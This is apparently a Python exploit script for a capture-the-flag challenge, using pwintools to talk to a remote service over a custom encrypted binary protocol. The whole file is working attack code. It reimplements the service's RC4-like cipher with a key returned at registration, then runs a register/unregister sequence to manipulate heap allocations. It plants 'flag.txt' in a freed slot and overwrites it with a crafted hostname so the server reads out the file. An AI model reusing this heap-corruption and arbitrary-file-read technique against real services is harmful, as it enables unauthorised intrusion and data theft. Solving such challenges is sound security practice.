from pwintools import *
from hashlib import sha256
import requests

log.log_level = 'debug'
DEBUG = False
if DEBUG:
    p = Remote('192.168.190.128', 1337)
    p.timeout = 100000000
else:
    p = Remote('apt41.ctf.kaf.sh', 1337)
    p.timeout = 5000

def Encryption(data):
    data = bytearray(data)
    pk = bytearray(p32(key))
    idx = [i for i in range(0x100)]
    v3 = 0
    for i in range(0x100):
        v8 = idx[i]
        v3 = (v8 + pk[i & 3] + v3) % 0x100
        idx[v3], idx[i] = v8, idx[v3]
    v2, v10, v1_idx = 0, 0, 0
    for i in range(0x100, 0, -1):
        v2 = (v2 + 1) % 0x100
        v11 = idx[v2]
        v10 = (v11 + v10) % 0x100
        v12 = idx[v10]
        idx[v10] = v11
        idx[v2] = v12
        data[v1_idx] ^= idx[(v12 + idx[v10]) % 0x100]
        v1_idx += 1
    return str(data)

def dump(s):
    return ''.join('{:02x}'.format(ord(c)) for c in s)

def register(ipv, ip, hash):
    assert (ipv == 4 and len(ip) == 4) or (ipv == 6 and len(ip) == 0x10)
    payload  = '\x80' + chr(ipv)
    payload += ip
    payload += hash
    payload  = payload.ljust(0x100)
    p.send(payload)
    res = p.recv(0x100)
    log.debug('register: ' + dump(res))
    assert res[0] == '\xaa'
    return u32(res[1:5])

def hostname(hn):
    payload  = '\x81'
    payload += hn
    payload  = payload.ljust(0x100)
    payload  = Encryption(payload)
    p.send(payload)
    res = Encryption(p.recv(0x100))
    log.debug('hostname: ' + dump(res))
    assert res[0] == '\xaa'

def lister():
    payload = Encryption('\x82' + '\x00'*0xff)
    p.send(payload)
    res = Encryption(p.recv(0x100))
    log.debug('lister: ' + dump(res))
    assert res[0] == '\xaa'
    res = [e for e in res[2:].split('\x00') if e]
    return res

def server():
    payload = Encryption('\x83' + '\x00'*0xff)
    p.send(payload)
    res = Encryption(p.recv(0x100))
    log.debug('server: ' + dump(res))
    assert res[0] == '\xaa'
    return res[1:].rstrip('\x00')

def unregister():
    payload = Encryption('\x90' + '\x00'*0xff)
    p.send(payload)
    res = p.recv(0x100)
    log.debug('unregister: ' + dump(res))
    assert res[0] == '\xaa'

key = register(4, '\x00'*4, 'A'*0x20)  # alloc(0x58), offset 0
hostname('A\0')  # alloc(0x1), offset 0x58
unregister()
key = register(6, '\x00'*0x10, 'flag.txt'.ljust(0x20, '\0'))  # alloc(0x60), offset 0x59
hostname('A\xc8\xaa\0')

print(server())